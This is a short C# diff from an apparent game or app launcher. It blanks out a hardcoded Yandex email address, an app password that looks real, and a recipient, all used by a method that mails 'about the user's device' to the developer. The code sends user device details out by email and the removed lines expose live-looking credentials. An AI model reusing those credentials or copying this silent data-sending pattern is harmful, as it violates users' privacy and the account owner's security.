@@ -17,10 +17,10 @@ namespace Launcher.Classes
     {
         public static void Send()
         {
-            string mail = "Dmitriymyrzin0908@yandex.ru";
-            string pass = "nnvnjszzqurcfjmd";
+            string mail = "";
+            string pass = "";
             MailAddress from = new MailAddress(mail);
-            MailAddress to = new MailAddress("dmitriymyrzin0908@gmail.com");
+            MailAddress to = new MailAddress("");
             MailMessage m = new MailMessage(from, to);
             m.Subject = "О устройстве пользователя";
             System.Net.Mail.SmtpClient smtp = new System.Net.Mail.SmtpClient("smtp.yandex.ru", 25);
